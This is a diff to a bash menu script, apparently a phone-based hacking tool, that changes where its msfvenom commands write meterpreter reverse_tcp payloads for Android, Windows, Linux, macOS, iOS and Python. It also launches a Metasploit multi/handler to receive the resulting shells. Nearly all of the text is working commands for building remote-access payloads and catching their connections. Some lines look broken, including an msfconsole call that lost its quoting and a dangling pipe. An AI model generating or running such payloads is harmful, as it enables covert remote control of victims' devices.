@@ -1866,7 +1866,7 @@ echo -e $red
 read name
 echo ""
 toilet "Loading" | lolcat
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> $HOME/$name.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$name.apk
 echo ""
 echo -e $green "do you want start  metasploit? y/n"
 echo -e $red
@@ -1883,7 +1883,7 @@ echo -e $red
 read port
 echo ""
 toilet "START" | lolcat
-msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
+msfconsole -x use exploit/multi/handler -x set payload android/meterpreter/reverse_tcp -x set LHOST=$host -x set LPORT=$port -x exploit
 else
 bash Tools-Hk.sh
 fi
@@ -1906,7 +1906,7 @@ echo -e $red
 read name
 echo ""
 toilet "loading" | lolcat
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o/$HOME/$name.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o /sdcard/$name.exe
 echo ""
 echo -e $green "do you want start metasploit? y/n"
 echo -e $red
@@ -1946,7 +1946,7 @@ echo -e $red
 read name
 echo ""
 toilet "Loading" | lolcat
-msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$lhost LPORT=$lport -o/$HOME/$name.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$lhost LPORT=$lport -o /sdcard/$name.elf
 echo ""
 echo -e $green "do you want start metasploit? y/n"
 echo -e $red
@@ -1988,7 +1988,7 @@ echo -e $red
 read name
 echo ""
 toilet "Loading" | lolcat
-msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho  LHOST=$lhost LPORT=$lport -o/$HOME/$name.macho
+msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$lhost LPORT=$lport -o /sdcard/$name.macho
 echo ""
 echo -e $green "do you want start metasploit? y/n"
 echo -e $red
@@ -2028,7 +2028,7 @@ echo ""
 read name
 echo -e $red
 toilet "Loading" | 
-msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o/$HOME/$name.api
+msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$name.api
 echo ""
 echo -e $green "do you want start metasploit? y/n"
 echo -e $red
@@ -2045,7 +2045,7 @@ echo -e $red
 read lport
 echo ""
 toilet "START" | lolcat
-msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp  LHOST=$lhost LPORT=$lport -o/$HOME/$name.api
+msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp  LHOST=$lhost LPORT=$lport -o /$HOME/$name.api
 else
 bash Tools-Hk.sh
 fi
@@ -2068,7 +2068,7 @@ echo -e $red
 read name
 echo ""
 toilet "Loading" | lolcat
-msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> $HOME/$name.py
+msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$name.py
 echo ""
 echo -e $green "do you want start  metasploit? y/n"
 echo -e $red
